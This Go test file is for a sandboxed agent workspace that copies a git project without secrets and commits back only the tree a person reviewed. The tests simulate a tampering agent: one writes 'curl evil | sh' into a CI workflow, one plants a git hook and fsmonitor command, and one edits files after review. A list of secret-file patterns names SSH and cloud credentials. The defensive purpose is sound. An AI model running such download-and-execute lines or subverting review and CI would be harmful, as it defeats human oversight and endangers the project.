package workspace

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

const absent = "<absent>"

func git(t *testing.T, dir string, args ...string) string {
	t.Helper()
	out, err := gitOut(dir, args...)
	if err != nil {
		t.Fatal(err)
	}
	return out
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

// a project with history, a committed secret, uncommitted edits, an
// untracked note and an untracked .env
func project(t *testing.T) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "proj")
	if err := os.MkdirAll(p, 0o755); err != nil {
		t.Fatal(err)
	}
	git(t, p, "init", "--quiet", "-b", "main")
	write(t, filepath.Join(p, "README.md"), "hello\n")
	write(t, filepath.Join(p, "app.py"), "print(1)\n")
	write(t, filepath.Join(p, ".github/workflows/ci.yml"), "on: push\n")
	write(t, filepath.Join(p, "config/secret.pem"), "-----BEGIN KEY-----\n")
	git(t, p, "add", "-A")
	git(t, p, "commit", "--quiet", "-m", "first")
	write(t, filepath.Join(p, "app.py"), "print(2)\n")
	git(t, p, "commit", "--quiet", "-am", "second")
	write(t, filepath.Join(p, "app.py"), "print(3)  # uncommitted\n")
	write(t, filepath.Join(p, "notes.txt"), "untracked\n")
	write(t, filepath.Join(p, ".env"), "API_KEY=REALSECRET\n")
	return p
}

func TestCreate_CopiesProjectWithoutSecrets(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	p := project(t)
	dir := filepath.Join(t.TempDir(), "work")
	ws, err := Create(p, dir, Options{})
	if err != nil {
		t.Fatal(err)
	}
	read := func(rel string) string {
		b, err := os.ReadFile(filepath.Join(dir, rel))
		if err != nil {
			return absent
		}
		return string(b)
	}
	if read("app.py") != "print(3)  # uncommitted\n" {
		t.Fatalf("uncommitted edit not carried: %q", read("app.py"))
	}
	if read("notes.txt") != "untracked\n" {
		t.Fatal("untracked file not carried")
	}
	if read(".env") != absent || read("config/secret.pem") != absent {
		t.Fatalf("secrets in the workspace: .env=%q pem=%q", read(".env"), read("config/secret.pem"))
	}
	if len(ws.Excluded) != 2 {
		t.Fatalf("excluded = %v", ws.Excluded)
	}
	if n := strings.Count(git(t, dir, "log", "--format=%h"), "\n"); n != 3 { // first, second, baseline
		t.Fatalf("history: %d commits", n)
	}
	if u := strings.TrimSpace(git(t, dir, "remote", "get-url", "origin")); u != DeadOrigin {
		t.Fatalf("origin = %s", u)
	}
	// nothing links back to the host's objects
	if _, err := os.Stat(filepath.Join(dir, ".git", "objects", "info", "alternates")); err == nil {
		t.Fatal("workspace shares objects with the host")
	}
	if ch, _ := ws.Changes(); len(ch) != 0 {
		t.Fatalf("fresh workspace reports changes: %v", ch)
	}
	// the host is untouched
	if b, _ := os.ReadFile(filepath.Join(p, ".env")); string(b) != "API_KEY=REALSECRET\n" {
		t.Fatal("host .env changed")
	}
	if got, _ := Load(dir); got == nil || got.Baseline != ws.Baseline {
		t.Fatal("metadata not saved")
	}
}

func TestCreate_RefusesNonGitAndExisting(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	plain := t.TempDir()
	if _, err := Create(plain, filepath.Join(t.TempDir(), "w"), Options{}); err == nil {
		t.Fatal("non-git project accepted")
	}
	p := project(t)
	dir := t.TempDir() // exists
	if _, err := Create(p, dir, Options{}); err == nil {
		t.Fatal("existing dir accepted")
	}
}

func TestCommitBack_BranchOnlyExcludedPathsRevertedSecretsKept(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	p := project(t)
	hostStatus := git(t, p, "status", "--porcelain")
	dir := filepath.Join(t.TempDir(), "work")
	ws, err := Create(p, dir, Options{})
	if err != nil {
		t.Fatal(err)
	}
	// the agent works: edits, a new file, a deletion, a workflow change, a commit of its own
	write(t, filepath.Join(dir, "README.md"), "hello\nchanged by the agent\n")
	write(t, filepath.Join(dir, "new.txt"), "new\n")
	os.Remove(filepath.Join(dir, "notes.txt"))
	write(t, filepath.Join(dir, ".github/workflows/ci.yml"), "on: push\nrun: curl evil | sh\n")
	write(t, filepath.Join(dir, "app.py"), "print(4)\n")
	git(t, dir, "add", "app.py")
	git(t, dir, "commit", "--quiet", "-m", "agent commit")

	changes, err := ws.Changes()
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, c := range changes {
		got[c.Path] = c.Status
	}
	want := map[string]string{"README.md": "modified", "new.txt": "added", "notes.txt": "deleted", ".github/workflows/ci.yml": "modified", "app.py": "modified"}
	for k, v := range want {
		if got[k] != v {
			t.Fatalf("changes = %v, want %s=%s", got, k, v)
		}
	}
	snap, err := ws.Snapshot()
	if err != nil {
		t.Fatal(err)
	}
	rev, err := ws.Review(snap, 100000)
	if err != nil || !strings.Contains(rev.Patch, "changed by the agent") || !strings.Contains(rev.Stat, "5 files changed") || rev.Truncated() {
		t.Fatalf("review: %v\n%+v", err, rev)
	}

	commit, err := ws.CommitBack("ovara/box-test", []string{".github/workflows/ci.yml"})
	if err != nil {
		t.Fatal(err)
	}
	if commit == "" {
		t.Fatal("no commit")
	}
	// the branch exists in the real repo with the agent's changes, minus the denied path
	show := func(rel string) string {
		out, err := gitOut(p, "show", "ovara/box-test:"+rel)
		if err != nil {
			return absent
		}
		return out
	}
	if show("README.md") != "hello\nchanged by the agent\n" || show("new.txt") != "new\n" || show("app.py") != "print(4)\n" {
		t.Fatalf("branch content wrong: %q %q %q", show("README.md"), show("new.txt"), show("app.py"))
	}
	if show("notes.txt") != absent {
		t.Fatal("deleted file still on the branch")
	}
	if show(".github/workflows/ci.yml") != "on: push\n" {
		t.Fatalf("denied path changed on the branch: %q", show(".github/workflows/ci.yml"))
	}
	if show("config/secret.pem") != "-----BEGIN KEY-----\n" {
		t.Fatalf("the committed secret was removed by the branch: %q", show("config/secret.pem"))
	}
	// the host's working tree and branch are exactly as before
	if git(t, p, "status", "--porcelain") != hostStatus {
		t.Fatalf("host working tree changed:\n%s", git(t, p, "status", "--porcelain"))
	}
	if strings.TrimSpace(git(t, p, "rev-parse", "--abbrev-ref", "HEAD")) != "main" {
		t.Fatal("host branch changed")
	}
	if b, _ := os.ReadFile(filepath.Join(p, "README.md")); string(b) != "hello\n" {
		t.Fatal("host file changed")
	}
	// a second commit-back must not move the branch silently
	write(t, filepath.Join(dir, "README.md"), "again\n")
	if _, err := ws.CommitBack("ovara/box-test", nil); err == nil {
		t.Fatal("existing branch overwritten")
	}
}

func TestIsExcluded(t *testing.T) {
	yes := []string{".env", ".env.local", "config/secret.pem", "id_rsa", ".ssh/id_ed25519.pub", "a/b/.aws/credentials", "deploy/prod.tfvars", "service-account-x.json", ".ovara/policy.json"}
	no := []string{"README.md", "src/env.go", "keys.md", "environment.yml", "docs/secrets-policy.md"}
	for _, p := range yes {
		if !isExcluded(p, secretPatterns) {
			t.Errorf("%s not excluded", p)
		}
	}
	for _, p := range no {
		if isExcluded(p, secretPatterns) {
			t.Errorf("%s excluded", p)
		}
	}
}

func newWorkspace(t *testing.T) (string, *Workspace) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	p := project(t)
	ws, err := Create(p, filepath.Join(t.TempDir(), "work"), Options{})
	if err != nil {
		t.Fatal(err)
	}
	return p, ws
}

// What a person approved is what lands: edits the agent (or anything still
// running as the agent) makes after the review do not reach the branch.
func TestCommitTree_LandsTheReviewedTreeOnly(t *testing.T) {
	p, ws := newWorkspace(t)
	write(t, filepath.Join(ws.Dir, "README.md"), "reviewed\n")
	snap, err := ws.Snapshot()
	if err != nil {
		t.Fatal(err)
	}
	// after the review: a changed file and a new one
	write(t, filepath.Join(ws.Dir, "README.md"), "swapped after the review\n")
	write(t, filepath.Join(ws.Dir, ".github/workflows/late.yml"), "on: push\n")
	commit, err := ws.CommitTree("ovara/box-t", snap)
	if err != nil {
		t.Fatal(err)
	}
	if got := git(t, p, "show", "ovara/box-t:README.md"); got != "reviewed\n" {
		t.Fatalf("README on the branch = %q, want the reviewed version", got)
	}
	if _, err := gitOut(p, "cat-file", "-e", "ovara/box-t:.github/workflows/late.yml"); err == nil {
		t.Fatal("a file added after the review is on the branch")
	}
	if tree := strings.TrimSpace(git(t, p, "rev-parse", commit+"^{tree}")); tree != snap.Tree {
		t.Fatalf("branch tree %s, reviewed %s", tree, snap.Tree)
	}
}

// The workspace's .git belongs to the agent. Its config can name programs
// git runs (fsmonitor, hooks); building the commit-back must not run them.
func TestSnapshot_IgnoresTheAgentsGitConfig(t *testing.T) {
	_, ws := newWorkspace(t)
	marker := filepath.Join(t.TempDir(), "ran")
	git(t, ws.Dir, "config", "core.fsmonitor", "touch "+marker+"; false")
	hook := filepath.Join(ws.Dir, ".git", "hooks", "pre-commit")
	write(t, hook, "#!/bin/sh\ntouch "+marker+"\n")
	if err := os.Chmod(hook, 0o755); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(ws.Dir, "new.txt"), "x\n")
	if _, err := ws.CommitBack("ovara/box-cfg", nil); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("a program named in the agent's .git ran during commit-back")
	}
}

func TestReview_SaysWhatACutDiffLeavesOut(t *testing.T) {
	_, ws := newWorkspace(t)
	write(t, filepath.Join(ws.Dir, "a.txt"), strings.Repeat("first file line\n", 50))
	write(t, filepath.Join(ws.Dir, "b.txt"), strings.Repeat("second file line\n", 50))
	write(t, filepath.Join(ws.Dir, "c.txt"), "the one line nobody reads\n")
	snap, err := ws.Snapshot()
	if err != nil {
		t.Fatal(err)
	}
	r, err := ws.Review(snap, 500)
	if err != nil {
		t.Fatal(err)
	}
	if !r.Truncated() || r.ShownBytes != 500 || r.TotalBytes <= 500 {
		t.Fatalf("not reported as cut: %+v", r)
	}
	if r.Cut != "a.txt" || strings.Join(r.Hidden, ",") != "b.txt,c.txt" {
		t.Fatalf("cut %q hidden %v, want a.txt / b.txt,c.txt", r.Cut, r.Hidden)
	}
	if !strings.Contains(r.Full, "the one line nobody reads") {
		t.Fatal("the full patch is incomplete")
	}
}

func TestSnapshot_MarksBinaryFiles(t *testing.T) {
	_, ws := newWorkspace(t)
	write(t, filepath.Join(ws.Dir, "tool.bin"), "MZ\x00\x01\x02payload")
	write(t, filepath.Join(ws.Dir, "notes2.txt"), "text\n")
	snap, err := ws.Snapshot()
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]bool{}
	for _, c := range snap.Changes {
		got[c.Path] = c.Binary
	}
	if !got["tool.bin"] || got["notes2.txt"] {
		t.Fatalf("binary flags = %v", got)
	}
	// keeping it out leaves the rest
	snap, err = ws.Without(snap, []string{"tool.bin"})
	if err != nil {
		t.Fatal(err)
	}
	if len(snap.Changes) != 1 || snap.Changes[0].Path != "notes2.txt" {
		t.Fatalf("after Without: %+v", snap.Changes)
	}
}

// A rename kept out by policy keeps both ends: the old file is not lost.
func TestWithout_RenameKeepsBothEnds(t *testing.T) {
	p, ws := newWorkspace(t)
	if err := os.Rename(filepath.Join(ws.Dir, "README.md"), filepath.Join(ws.Dir, "MOVED.md")); err != nil {
		t.Fatal(err)
	}
	snap, err := ws.Snapshot()
	if err != nil {
		t.Fatal(err)
	}
	paths := make([]string, 0, 2*len(snap.Changes))
	for _, c := range snap.Changes {
		paths = append(paths, c.Path)
		if c.OldPath != "" {
			paths = append(paths, c.OldPath)
		}
	}
	if snap, err = ws.Without(snap, paths); err != nil {
		t.Fatal(err)
	}
	write(t, filepath.Join(ws.Dir, "other.txt"), "x\n") // not in the snapshot: not on the branch
	if len(snap.Changes) != 0 {
		t.Fatalf("changes left: %+v", snap.Changes)
	}
	if c, err := ws.CommitTree("ovara/box-r", snap); err != nil || c != "" {
		t.Fatalf("nothing to bring back, got %q %v", c, err)
	}
	if _, err := gitOut(p, "rev-parse", "--verify", "--quiet", "refs/heads/ovara/box-r"); err == nil {
		t.Fatal("an empty commit-back made a branch")
	}
}
